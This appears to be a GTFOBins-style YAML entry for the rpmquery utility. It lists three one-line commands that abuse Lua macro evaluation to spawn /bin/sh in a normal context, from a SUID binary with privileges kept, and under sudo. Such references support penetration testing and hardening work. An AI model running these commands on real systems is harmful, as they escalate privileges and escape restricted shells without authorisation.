---
functions:
  shell:
    - code: rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
  suid:
    - code: ./rpmquery --eval '%{lua:posix.exec("/bin/sh", "-p")}'
  sudo:
    - code: sudo rpmquery --eval '%{lua:posix.exec("/bin/sh")}'
---
